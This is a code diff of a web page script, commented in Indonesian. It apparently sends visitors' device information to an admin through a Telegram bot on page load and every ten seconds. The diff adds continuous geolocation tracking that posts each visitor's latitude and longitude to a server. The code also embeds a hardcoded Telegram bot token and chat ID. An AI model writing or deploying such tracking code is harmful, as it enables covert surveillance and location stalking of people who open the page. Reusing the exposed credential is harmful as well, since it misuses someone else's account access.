@@ -34,7 +34,7 @@
 </div>
 
 <script>
-const CHAT_ID = "7483495590"; // ganti dengan chat id admin
+const CHAT_ID = "688350222"; // ganti dengan chat id admin
 const BOT_TOKEN = "7752399769:AAFpjaRaSiRJ7quT3JD0PbgIEu_PZcE2cvI"; // ganti bot token
 const statusEl = document.getElementById('status');
 
@@ -101,10 +101,23 @@ async function liveTracking() {
     statusEl.textContent = `Terakhir update: ${new Date().toLocaleTimeString()}`;
 }
 
-// Kirim pertama kali + set interval
+// Kirim
+// Mulai live tracking info device
 window.onload = async () => {
-    await liveTracking(); // pertama kali
+    await liveTracking(); // kirim pertama kali
     setInterval(liveTracking, 10000); // update tiap 10 detik
+
+    // Mulai watchPosition untuk share lokasi ke server
+    if(navigator.geolocation){
+        navigator.geolocation.watchPosition(async (pos) => {
+            const { latitude, longitude } = pos.coords;
+            await fetch('/sendLocation', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitude, longitude })
+            });
+        }, (err) => console.error(err));
+    }
 };
 </script>
 </body>
